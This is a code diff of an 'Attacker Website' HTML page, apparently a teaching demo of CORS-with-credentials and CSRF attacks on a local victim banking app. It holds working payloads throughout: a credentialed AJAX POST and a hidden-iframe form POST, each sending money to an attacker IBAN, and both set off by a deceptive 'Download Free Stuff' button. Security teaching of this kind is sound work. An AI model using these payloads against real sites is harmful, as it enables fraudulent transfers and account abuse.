@@ -11,7 +11,7 @@
 <h2 style="color: red">Attacker Website</h2>
 
 <div style="border:2px solid green">
-    <h4 style="color: red">Transfer Money (via AJAX, CORS)</h4>
+    <h4 style="color: red">Transfer Money (via AJAX) --- CORS - XSS: Cross Site Scripting</h4>
     <input type="button" value="Download Free Stuff" onclick="transferAmount()">
 </div>
 
@@ -22,8 +22,10 @@
 
 
     function transferAmount() {
-        $.ajax("http://localhost:8080/victim/transfer-rest", {
+        $.ajax({
+            url:"http://localhost:8080/victim/transfer-rest",
             method: "POST",
+            xhrFields: { withCredentials: true }, // CORS sending credentials
             data: JSON.stringify({
                 recipientFullName:"Attacker",
                 recipientIban:"ATACKERIBAN013213",
@@ -35,7 +37,6 @@
             }
         });
     }
-    transferAmount();
 
     $.ajax("http://localhost:8080/rest/user/current", {
         method: "GET",
@@ -48,7 +49,7 @@
 <br/>
 <iframe  style="display: none" id="hiddenIframe" name="hiddenIframe"></iframe>
 <div style="border:2px solid red">
-    <h4 style="color:red;">Transfer Money (via FORM POST, XSRF)</h4>
+    <h4 style="color:red;">Transfer Money (via FORM POST) --- CSRF: Cross Site Request Forging</h4>
     <form method="post" action="http://localhost:8080/victim/transfer-form" target="hiddenIframe">
         <input type="hidden" name="recipientFullName" value="Attacker" />
         <input type="hidden" name="recipientIban" value="ATTACKERIBAN13123" />
